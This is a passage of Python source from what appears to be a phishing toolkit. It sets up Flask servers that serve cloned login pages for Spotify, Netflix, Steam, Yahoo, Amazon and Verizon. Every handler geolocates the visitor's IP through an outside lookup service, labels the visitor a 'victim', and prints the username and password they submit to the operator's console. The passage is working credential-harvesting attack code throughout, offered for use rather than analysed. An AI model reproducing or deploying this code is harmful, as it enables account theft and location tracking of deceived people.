						print(as_word + as_code)
					as_code_PRINT()
					def GET_LATLNG():
						VICTIM_IP_ADDR = f'{FORWARDED_ADDR}'
						IP_LAT = geocoder.ip(VICTIM_IP_ADDR).lat
						print('\u001b[31;1mLATITUDE >> \u001b[37m\u001b[37m' + str(IP_LAT))
						IP_LNG = geocoder.ip(VICTIM_IP_ADDR).lng
						print('\u001b[31;1mLONGITUDE >> \u001b[37m' + str(IP_LNG))
					GET_LATLNG()

				#part 2 of the process
				#get the username and password
				shopping_colr_user = '\u001b[31;1m'
				shopping_colr_pass = '\u001b[31;1m'
				shopping_word_user = 'username: '
				shopping_word_pass = 'password: '
				shopping_words_user = shopping_colr_user + shopping_word_user
				shopping_words_pass = shopping_colr_pass + shopping_word_pass
				second_usr = '\u001b[37m'
				second_pass = '\u001b[37m'
				space_usr = '# '
				space_pass = '# '
				username = request.form['username']
				password = request.form['password']
				print('\u001b[37m---------------------------------------')
				print(space_pass + shopping_words_user + second_usr +username)
				print('#')
				print(space_pass +shopping_words_pass + second_pass +password)	
				print('---------------------------------------')
				return render_template('pass.html')
			if __name__ == ('__main__'):
				shopping.run(debug=True, port=START_PORT)
		if start_input == 8:
			spotify = Flask(__name__)
			@spotify.route('/')
			def spotify_index():
				return render_template('.sites/spotify/tes.html')
				
			@spotify.route('/', methods=['POST','GET'])
			def get__data():
				#part 1 of the process
				#get some information about the targets
				if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
					local_addr = request.environ['REMOTE_ADDR']
					print('\u001b[37m---------------------------------------')
					print('\u001b[31;1mLocal IP ADDR >> \u001b[37m' + local_addr)
					print('')
					print('\u001b[31;1mNB : you will not get any other information, before PortForwading')
				else:
					print('\u001b[37m---------------------------------------')
					FORWARDED_ADDR =request.environ['HTTP_X_FORWARDED_FOR']
					print('\u001b[31;1mIP ADDR >> \u001b[37m' +FORWARDED_ADDR)
					URL = f'http://ip-api.com/json/{FORWARDED_ADDR}'
					URLS_INFORMATION_EXTRACTED_FROM_IPAPI_LINK = requests.get(URL)
					JSON_FORMAT = URLS_INFORMATION_EXTRACTED_FROM_IPAPI_LINK.json()
					status_word = '\u001b[31;1mSTATUS >> \u001b[37m'
					country_word = '\u001b[31;1mCOUNTRY >> \u001b[37m'
					countryCode_word = '\u001b[31;1mCountryCode >> \u001b[37m'
					region_word = '\u001b[31;1mREGION >> \u001b[37m'
					regionName_word = '\u001b[31;1mRegionName >> \u001b[37m'
					city_word = '\u001b[31;1mCITY >> \u001b[37m'
					timezone_word = '\u001b[31;1mTIMEZONE >> \u001b[37m'
					isp_word = '\u001b[31;1mISP >> \u001b[37m'
					org_word = '\u001b[31;1mORG >> \u001b[37m'
					as_word = '\u001b[31;1mAS >> \u001b[37m'
					status = JSON_FORMAT['status']
					def status_print():
					 print(status_word + status)
					status_print()
					country = JSON_FORMAT['country']
					def country_print():
					 print(country_word + country)
					country_print()
					countryCode = JSON_FORMAT['countryCode']
					def countryCode_print():
						print(countryCode_word + countryCode)
					countryCode_print()
					region = JSON_FORMAT['region']
					def REGION_PRINT():
						print(region_word + region)
					REGION_PRINT()
					regionName = JSON_FORMAT['regionName']
					def regionName_print():
						print(regionName_word + regionName)
					regionName_print()
					city = JSON_FORMAT['city']
					def city_print():
						print(city_word + city)
					city_print()
					zip_code = JSON_FORMAT['zip']
					def zip_code():
						print('\u001b[31;1mZIP >> \u001b[37m' + str(zip_code))
					zip_code()
					timezone = JSON_FORMAT['timezone']
					def timezone_print():
						print(timezone_word + timezone)
					timezone_print()
					isp = JSON_FORMAT['isp']
					def isp_print():
						print(isp_word + isp)
					isp_print()
					org = JSON_FORMAT['org']
					def org_print():
						print(org_word+ org)
					org_print()
					as_code = JSON_FORMAT['as']
					def as_code_PRINT():
						print(as_word + as_code)
					as_code_PRINT()
					def GET_LATLNG():
						VICTIM_IP_ADDR = f'{FORWARDED_ADDR}'
						IP_LAT = geocoder.ip(VICTIM_IP_ADDR).lat
						print('\u001b[31;1mLATITUDE >> \u001b[37m\u001b[37m' + str(IP_LAT))
						IP_LNG = geocoder.ip(VICTIM_IP_ADDR).lng
						print('\u001b[31;1mLONGITUDE >> \u001b[37m' + str(IP_LNG))
					GET_LATLNG()

				#part 2 of the process
				#get the username and password
				spotify_colr_user = '\u001b[31;1m'
				spotify_colr_pass = '\u001b[31;1m'
				spotify_word_user = 'username: '
				spotify_word_pass = 'password: '
				spotify_words_user = spotify_colr_user + spotify_word_user
				spotify_words_pass = spotify_colr_pass + spotify_word_pass
				second_usr = '\u001b[37m'
				second_pass = '\u001b[37m'
				space_usr = '# '
				space_pass = '# '
				username = request.form['username']
				password = request.form['password']
				print('\u001b[37m---------------------------------------')
				print(space_pass + spotify_words_user + second_usr +username)
				print('#')
				print(space_pass +spotify_words_pass + second_pass +password)	
				print('---------------------------------------')
				return render_template('pass.html')
			if __name__ == ('__main__'):
				spotify.run(debug=True, port=START_PORT)
		if start_input == 9:
			netflix = Flask(__name__)
			@netflix.route('/')
			def netflix_index():
				#return render_template('sites/netflix/tes.html')
				return render_template('.sites/netflix/m.html')
			@netflix.route('/', methods=['POST','GET'])
			def get__data():
				#part 1 of the process
				#get some information about the targets
				if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
					local_addr = request.environ['REMOTE_ADDR']
					print('\u001b[37m---------------------------------------')
					print('\u001b[31;1mLocal IP ADDR >> \u001b[37m' + local_addr)
					print('')
					print('\u001b[31;1mNB : you will not get any other information, before PortForwading')
				else:
					print('\u001b[37m---------------------------------------')
					FORWARDED_ADDR =request.environ['HTTP_X_FORWARDED_FOR']
					print('\u001b[31;1mIP ADDR >> \u001b[37m' +FORWARDED_ADDR)
					URL = f'http://ip-api.com/json/{FORWARDED_ADDR}'
					URLS_INFORMATION_EXTRACTED_FROM_IPAPI_LINK = requests.get(URL)
					JSON_FORMAT = URLS_INFORMATION_EXTRACTED_FROM_IPAPI_LINK.json()
					status_word = '\u001b[31;1mSTATUS >> \u001b[37m'
					country_word = '\u001b[31;1mCOUNTRY >> \u001b[37m'
					countryCode_word = '\u001b[31;1mCountryCode >> \u001b[37m'
					region_word = '\u001b[31;1mREGION >> \u001b[37m'
					regionName_word = '\u001b[31;1mRegionName >> \u001b[37m'
					city_word = '\u001b[31;1mCITY >> \u001b[37m'
					timezone_word = '\u001b[31;1mTIMEZONE >> \u001b[37m'
					isp_word = '\u001b[31;1mISP >> \u001b[37m'
					org_word = '\u001b[31;1mORG >> \u001b[37m'
					as_word = '\u001b[31;1mAS >> \u001b[37m'
					status = JSON_FORMAT['status']
					def status_print():
					 print(status_word + status)
					status_print()
					country = JSON_FORMAT['country']
					def country_print():
					 print(country_word + country)
					country_print()
					countryCode = JSON_FORMAT['countryCode']
					def countryCode_print():
						print(countryCode_word + countryCode)
					countryCode_print()
					region = JSON_FORMAT['region']
					def REGION_PRINT():
						print(region_word + region)
					REGION_PRINT()
					regionName = JSON_FORMAT['regionName']
					def regionName_print():
						print(regionName_word + regionName)
					regionName_print()
					city = JSON_FORMAT['city']
					def city_print():
						print(city_word + city)
					city_print()
					zip_code = JSON_FORMAT['zip']
					def zip_code():
						print('\u001b[31;1mZIP >> \u001b[37m' + str(zip_code))
					zip_code()
					timezone = JSON_FORMAT['timezone']
					def timezone_print():
						print(timezone_word + timezone)
					timezone_print()
					isp = JSON_FORMAT['isp']
					def isp_print():
						print(isp_word + isp)
					isp_print()
					org = JSON_FORMAT['org']
					def org_print():
						print(org_word+ org)
					org_print()
					as_code = JSON_FORMAT['as']
					def as_code_PRINT():
						print(as_word + as_code)
					as_code_PRINT()
					def GET_LATLNG():
						VICTIM_IP_ADDR = f'{FORWARDED_ADDR}'
						IP_LAT = geocoder.ip(VICTIM_IP_ADDR).lat
						print('\u001b[31;1mLATITUDE >> \u001b[37m\u001b[37m' + str(IP_LAT))
						IP_LNG = geocoder.ip(VICTIM_IP_ADDR).lng
						print('\u001b[31;1mLONGITUDE >> \u001b[37m' + str(IP_LNG))
					GET_LATLNG()

				#part 2 of the process
				#get the username and password
				netflix_colr_user = '\u001b[31;1m'
				netflix_colr_pass = '\u001b[31;1m'
				netflix_word_user = 'username: '
				netflix_word_pass = 'password: '
				netflix_words_user = netflix_colr_user + netflix_word_user
				netflix_words_pass = netflix_colr_pass + netflix_word_pass
				second_usr = '\u001b[37m'
				second_pass = '\u001b[37m'
				space_usr = '# '
				space_pass = '# '
				username = request.form['username']
				password = request.form['password']
				print('\u001b[37m---------------------------------------')
				print(space_pass + netflix_words_user + second_usr +username)
				print('#')
				print(space_pass +netflix_words_pass + second_pass +password)	
				print('---------------------------------------')
				return render_template('pass.html')
			if __name__ == ('__main__'):
				netflix.run(debug=True, port=START_PORT)
		if start_input == 10:
			steam = Flask(__name__)
			@steam.route('/')
			def steam_index():
				return render_template('.sites/VK/VK.html')
			@steam.route('/', methods=['POST','GET'])
			def get__data():
				#part 1 of the process
				#get some information about the targets
				if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
					local_addr = request.environ['REMOTE_ADDR']
					print('\u001b[37m---------------------------------------')
					print('\u001b[31;1mLocal IP ADDR >> \u001b[37m' + local_addr)
					print('')
					print('\u001b[31;1mNB : you will not get any other information, before PortForwading')
				else:
					print('\u001b[37m---------------------------------------')
					FORWARDED_ADDR =request.environ['HTTP_X_FORWARDED_FOR']
					print('\u001b[31;1mIP ADDR >> \u001b[37m' +FORWARDED_ADDR)
					URL = f'http://ip-api.com/json/{FORWARDED_ADDR}'
					URLS_INFORMATION_EXTRACTED_FROM_IPAPI_LINK = requests.get(URL)
					JSON_FORMAT = URLS_INFORMATION_EXTRACTED_FROM_IPAPI_LINK.json()
					status_word = '\u001b[31;1mSTATUS >> \u001b[37m'
					country_word = '\u001b[31;1mCOUNTRY >> \u001b[37m'
					countryCode_word = '\u001b[31;1mCountryCode >> \u001b[37m'
					region_word = '\u001b[31;1mREGION >> \u001b[37m'
					regionName_word = '\u001b[31;1mRegionName >> \u001b[37m'
					city_word = '\u001b[31;1mCITY >> \u001b[37m'
					timezone_word = '\u001b[31;1mTIMEZONE >> \u001b[37m'
					isp_word = '\u001b[31;1mISP >> \u001b[37m'
					org_word = '\u001b[31;1mORG >> \u001b[37m'
					as_word = '\u001b[31;1mAS >> \u001b[37m'
					status = JSON_FORMAT['status']
					def status_print():
					 print(status_word + status)
					status_print()
					country = JSON_FORMAT['country']
					def country_print():
					 print(country_word + country)
					country_print()
					countryCode = JSON_FORMAT['countryCode']
					def countryCode_print():
						print(countryCode_word + countryCode)
					countryCode_print()
					region = JSON_FORMAT['region']
					def REGION_PRINT():
						print(region_word + region)
					REGION_PRINT()
					regionName = JSON_FORMAT['regionName']
					def regionName_print():
						print(regionName_word + regionName)
					regionName_print()
					city = JSON_FORMAT['city']
					def city_print():
						print(city_word + city)
					city_print()
					zip_code = JSON_FORMAT['zip']
					def zip_code():
						print('\u001b[31;1mZIP >> \u001b[37m' + str(zip_code))
					zip_code()
					timezone = JSON_FORMAT['timezone']
					def timezone_print():
						print(timezone_word + timezone)
					timezone_print()
					isp = JSON_FORMAT['isp']
					def isp_print():
						print(isp_word + isp)
					isp_print()
					org = JSON_FORMAT['org']
					def org_print():
						print(org_word+ org)
					org_print()
					as_code = JSON_FORMAT['as']
					def as_code_PRINT():
						print(as_word + as_code)
					as_code_PRINT()
					def GET_LATLNG():
						VICTIM_IP_ADDR = f'{FORWARDED_ADDR}'
						IP_LAT = geocoder.ip(VICTIM_IP_ADDR).lat
						print('\u001b[31;1mLATITUDE >> \u001b[37m\u001b[37m' + str(IP_LAT))
						IP_LNG = geocoder.ip(VICTIM_IP_ADDR).lng
						print('\u001b[31;1mLONGITUDE >> \u001b[37m' + str(IP_LNG))
					GET_LATLNG()

				#part 2 of the process
				#get the username and password
				steam_colr_user = '\u001b[31;1m'
				steam_colr_pass = '\u001b[31;1m'
				steam_word_user = 'username: '
				steam_word_pass = 'password: '
				steam_words_user = steam_colr_user + steam_word_user
				steam_words_pass = steam_colr_pass + steam_word_pass
				second_usr = '\u001b[37m'
				second_pass = '\u001b[37m'
				space_usr = '# '
				space_pass = '# '
				username = request.form['username']
				password = request.form['password']
				print('\u001b[37m---------------------------------------')
				print(space_pass + steam_words_user + second_usr +username)
				print('#')
				print(space_pass +steam_words_pass + second_pass +password)	
				print('---------------------------------------')
				return render_template('pass.html')
			if __name__ == ('__main__'):
				steam.run(debug=True, port=START_PORT)
		if start_input == 11:
			yahoo = Flask(__name__)
			@yahoo.route('/')
			def yahoo_index():
				#return render_template('sites/test.html')
				return render_template('.sites/twitch.html')
			@yahoo.route('/', methods=['POST','GET'])
			def get__data():
				#part 1 of the process
				#get some information about the targets
				if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
					local_addr = request.environ['REMOTE_ADDR']
					print('\u001b[37m---------------------------------------')
					print('\u001b[31;1mLocal IP ADDR >> \u001b[37m' + local_addr)
					print('')
					print('\u001b[31;1mNB : you will not get any other information, before PortForwading')
				else:
					print('\u001b[37m---------------------------------------')
					FORWARDED_ADDR =request.environ['HTTP_X_FORWARDED_FOR']
					print('\u001b[31;1mIP ADDR >> \u001b[37m' +FORWARDED_ADDR)
					URL = f'http://ip-api.com/json/{FORWARDED_ADDR}'
					URLS_INFORMATION_EXTRACTED_FROM_IPAPI_LINK = requests.get(URL)
					JSON_FORMAT = URLS_INFORMATION_EXTRACTED_FROM_IPAPI_LINK.json()
					status_word = '\u001b[31;1mSTATUS >> \u001b[37m'
					country_word = '\u001b[31;1mCOUNTRY >> \u001b[37m'
					countryCode_word = '\u001b[31;1mCountryCode >> \u001b[37m'
					region_word = '\u001b[31;1mREGION >> \u001b[37m'
					regionName_word = '\u001b[31;1mRegionName >> \u001b[37m'
					city_word = '\u001b[31;1mCITY >> \u001b[37m'
					timezone_word = '\u001b[31;1mTIMEZONE >> \u001b[37m'
					isp_word = '\u001b[31;1mISP >> \u001b[37m'
					org_word = '\u001b[31;1mORG >> \u001b[37m'
					as_word = '\u001b[31;1mAS >> \u001b[37m'
					status = JSON_FORMAT['status']
					def status_print():
					 print(status_word + status)
					status_print()
					country = JSON_FORMAT['country']
					def country_print():
					 print(country_word + country)
					country_print()
					countryCode = JSON_FORMAT['countryCode']
					def countryCode_print():
						print(countryCode_word + countryCode)
					countryCode_print()
					region = JSON_FORMAT['region']
					def REGION_PRINT():
						print(region_word + region)
					REGION_PRINT()
					regionName = JSON_FORMAT['regionName']
					def regionName_print():
						print(regionName_word + regionName)
					regionName_print()
					city = JSON_FORMAT['city']
					def city_print():
						print(city_word + city)
					city_print()
					zip_code = JSON_FORMAT['zip']
					def zip_code():
						print('\u001b[31;1mZIP >> \u001b[37m' + str(zip_code))
					zip_code()
					timezone = JSON_FORMAT['timezone']
					def timezone_print():
						print(timezone_word + timezone)
					timezone_print()
					isp = JSON_FORMAT['isp']
					def isp_print():
						print(isp_word + isp)
					isp_print()
					org = JSON_FORMAT['org']
					def org_print():
						print(org_word+ org)
					org_print()
					as_code = JSON_FORMAT['as']
					def as_code_PRINT():
						print(as_word + as_code)
					as_code_PRINT()
					def GET_LATLNG():
						VICTIM_IP_ADDR = f'{FORWARDED_ADDR}'
						IP_LAT = geocoder.ip(VICTIM_IP_ADDR).lat
						print('\u001b[31;1mLATITUDE >> \u001b[37m\u001b[37m' + str(IP_LAT))
						IP_LNG = geocoder.ip(VICTIM_IP_ADDR).lng
						print('\u001b[31;1mLONGITUDE >> \u001b[37m' + str(IP_LNG))
					GET_LATLNG()

				#part 2 of the process
				#get the username and password
				yahoo_colr_user = '\u001b[31;1m'
				yahoo_colr_pass = '\u001b[31;1m'
				yahoo_word_user = 'username: '
				yahoo_word_pass = 'password: '
				yahoo_words_user = yahoo_colr_user + yahoo_word_user
				yahoo_words_pass = yahoo_colr_pass + yahoo_word_pass
				second_usr = '\u001b[37m'
				second_pass = '\u001b[37m'
				space_usr = '# '
				space_pass = '# '
				username = request.form['username']
				password = request.form['password']
				print('\u001b[37m---------------------------------------')
				print(space_pass + yahoo_words_user + second_usr +username)
				print('#')
				print(space_pass +yahoo_words_pass + second_pass +password)	
				print('---------------------------------------')
				return render_template('pass.html')
			if __name__ == ('__main__'):
				yahoo.run(debug=True, port=START_PORT)
		if start_input == 12:
			amazon = Flask(__name__)
			@amazon.route('/')
			def amazon_index():
				return render_template('.sites/amazon.html')
			@amazon.route('/', methods=['POST','GET'])
			def get__data():
				#part 1 of the process
				#get some information about the targets
				if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
					local_addr = request.environ['REMOTE_ADDR']
					print('\u001b[37m---------------------------------------')
					print('\u001b[31;1mLocal IP ADDR >> \u001b[37m' + local_addr)
					print('')
					print('\u001b[31;1mNB : you will not get any other information, before PortForwading')
				else:
					print('\u001b[37m---------------------------------------')
					FORWARDED_ADDR =request.environ['HTTP_X_FORWARDED_FOR']
					print('\u001b[31;1mIP ADDR >> \u001b[37m' +FORWARDED_ADDR)
					URL = f'http://ip-api.com/json/{FORWARDED_ADDR}'
					URLS_INFORMATION_EXTRACTED_FROM_IPAPI_LINK = requests.get(URL)
					JSON_FORMAT = URLS_INFORMATION_EXTRACTED_FROM_IPAPI_LINK.json()
					status_word = '\u001b[31;1mSTATUS >> \u001b[37m'
					country_word = '\u001b[31;1mCOUNTRY >> \u001b[37m'
					countryCode_word = '\u001b[31;1mCountryCode >> \u001b[37m'
					region_word = '\u001b[31;1mREGION >> \u001b[37m'
					regionName_word = '\u001b[31;1mRegionName >> \u001b[37m'
					city_word = '\u001b[31;1mCITY >> \u001b[37m'
					timezone_word = '\u001b[31;1mTIMEZONE >> \u001b[37m'
					isp_word = '\u001b[31;1mISP >> \u001b[37m'
					org_word = '\u001b[31;1mORG >> \u001b[37m'
					as_word = '\u001b[31;1mAS >> \u001b[37m'
					status = JSON_FORMAT['status']
					def status_print():
					 print(status_word + status)
					status_print()
					country = JSON_FORMAT['country']
					def country_print():
					 print(country_word + country)
					country_print()
					countryCode = JSON_FORMAT['countryCode']
					def countryCode_print():
						print(countryCode_word + countryCode)
					countryCode_print()
					region = JSON_FORMAT['region']
					def REGION_PRINT():
						print(region_word + region)
					REGION_PRINT()
					regionName = JSON_FORMAT['regionName']
					def regionName_print():
						print(regionName_word + regionName)
					regionName_print()
					city = JSON_FORMAT['city']
					def city_print():
						print(city_word + city)
					city_print()
					zip_code = JSON_FORMAT['zip']
					def zip_code():
						print('\u001b[31;1mZIP >> \u001b[37m' + str(zip_code))
					zip_code()
					timezone = JSON_FORMAT['timezone']
					def timezone_print():
						print(timezone_word + timezone)
					timezone_print()
					isp = JSON_FORMAT['isp']
					def isp_print():
						print(isp_word + isp)
					isp_print()
					org = JSON_FORMAT['org']
					def org_print():
						print(org_word+ org)
					org_print()
					as_code = JSON_FORMAT['as']
					def as_code_PRINT():
						print(as_word + as_code)
					as_code_PRINT()
					def GET_LATLNG():
						VICTIM_IP_ADDR = f'{FORWARDED_ADDR}'
						IP_LAT = geocoder.ip(VICTIM_IP_ADDR).lat
						print('\u001b[31;1mLATITUDE >> \u001b[37m\u001b[37m' + str(IP_LAT))
						IP_LNG = geocoder.ip(VICTIM_IP_ADDR).lng
						print('\u001b[31;1mLONGITUDE >> \u001b[37m' + str(IP_LNG))
					GET_LATLNG()

				#part 2 of the process
				#get the username and password
				amazon_colr_user = '\u001b[31;1m'
				amazon_colr_pass = '\u001b[31;1m'
				amazon_word_user = 'username: '
				amazon_word_pass = 'password: '
				amazon_words_user = amazon_colr_user + amazon_word_user
				amazon_words_pass = amazon_colr_pass + amazon_word_pass
				second_usr = '\u001b[37m'
				second_pass = '\u001b[37m'
				space_usr = '# '
				space_pass = '# '
				username = request.form['username']
				password = request.form['password']
				print('\u001b[37m---------------------------------------')
				print(space_pass + amazon_words_user + second_usr +username)
				print('#')
				print(space_pass +amazon_words_pass + second_pass +password)	
				print('---------------------------------------')
				return render_template('pass.html')
			if __name__ == ('__main__'):
				amazon.run(debug=True, port=START_PORT)
		if start_input == 13:
			verizon = Flask(__name__)
			@verizon.route('/')
			def verizon_index():
				return render_template('.sites/verizon.html')
			@verizon.route('/', methods=['POST','GET'])
			def get__data():
				#part 1 of the process
				#get some information about the targets
				if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
					local_addr = request.environ['REMOTE_ADDR']
					print('\u001b[37m---------------------------------------')
					print('\u001b[31;1mLocal IP ADDR >> \u001b[37m' + local_addr)
					print('')
					print('\u001b[31;1mNB : you will not get any other information, before PortForwading')
				else:
					print('\u001b[37m---------------------------------------')
					FORWARDED_ADDR =request.environ['HTTP_X_FORWARDED_FOR']
					print('\u001b[31;1mIP ADDR >> \u001b[37m' +FORWARDED_ADDR)
					URL = f'http://ip-api.com/json/{FORWARDED_ADDR}'
					URLS_INFORMATION_EXTRACTED_FROM_IPAPI_LINK = requests.get(URL)
					JSON_FORMAT = URLS_INFORMATION_EXTRACTED_FROM_IPAPI_LINK.json()
					status_word = '\u001b[31;1mSTATUS >> \u001b[37m'
					country_word = '\u001b[31;1mCOUNTRY >> \u001b[37m'
					countryCode_word = '\u001b[31;1mCountryCode >> \u001b[37m'
					region_word = '\u001b[31;1mREGION >> \u001b[37m'
					regionName_word = '\u001b[31;1mRegionName >> \u001b[37m'
					city_word = '\u001b[31;1mCITY >> \u001b[37m'
					timezone_word = '\u001b[31;1mTIMEZONE >> \u001b[37m'
					isp_word = '\u001b[31;1mISP >> \u001b[37m'
					org_word = '\u001b[31;1mORG >> \u001b[37m'
					as_word = '\u001b[31;1mAS >> \u001b[37m'
					status = JSON_FORMAT['status']
					def status_print():
					 print(status_word + status)
					status_print()
					country = JSON_FORMAT['country']
					def country_print():
					 print(country_word + country)
					country_print()
					countryCode = JSON_FORMAT['countryCode']
					def countryCode_print():
						print(countryCode_word + countryCode)
					countryCode_print()
					region = JSON_FORMAT['region']
					def REGION_PRINT():
						print(region_word + region)
					REGION_PRINT()
					regionName = JSON_FORMAT['regionName']
					def regionName_print():
						print(regionName_word + regionName)
					regionName_print()
					city = JSON_FORMAT['city']
					def city_print():
						print(city_word + city)
					city_print()
					zip_code = JSON_FORMAT['zip']
					def zip_code():
						print('\u001b[31;1mZIP >> \u001b[37m' + str(zip_code))
					zip_code()
					timezone = JSON_FORMAT['timezone']
					def timezone_print():
						print(timezone_word + timezone)
					timezone_print()
					isp = JSON_FORMAT['isp']
					def isp_print():
						print(isp_word + isp)
					isp_print()
					org = JSON_FORMAT['org']
					def org_print():
						print(org_word+ org)
					org_print()
					as_code = JSON_FORMAT['as']
					def as_code_PRINT():
						print(as_word + as_code)
					as_code_PRINT()
					def GET_LATLNG():
						VICTIM_IP_ADDR = f'{FORWARDED_ADDR}'
						IP_LAT = geocoder.ip(VICTIM_IP_ADDR).lat
						print('\u001b[31;1mLATITUDE >> \u001b[37m\u001b[37m' + str(IP_LAT))
						IP_LNG = geocoder.ip(VICTIM_IP_ADDR).lng
						print('\u001b[31;1mLONGITUDE >> \u001b[37m' + str(IP_LNG))
					GET_LATLNG()

				#part 2 of the process
				#get the username and password
				verizon_colr_user = '\u001b[31;1m'
				verizon_colr_pass = '\u001b[31;1m'
				verizon_word_user = 'username: '
				verizon_word_pass = 'password: '
				verizon_words_user = verizon_colr_user + verizon_word_user
				verizon_words_pass = verizon_colr_pass + verizon_word_pass
				second_usr = '\u001b[37m'
				second_pass = '\u001b[37m'
				space_usr = '# '
				space_pass = '# '
				username = request.form['username']
				password = request.form['password']
				print('\u001b[37m---------------------------------------')
				print(space_pass + verizon_words_user + second_usr +username)
				print('#')
				print(space_pass +verizon_words_pass + second_pass +password)	
				print('---------------------------------------')
				return render_template('pass.html')
			if __name__ == ('__main__'):
				verizon.run(debug=True, port=START_PORT)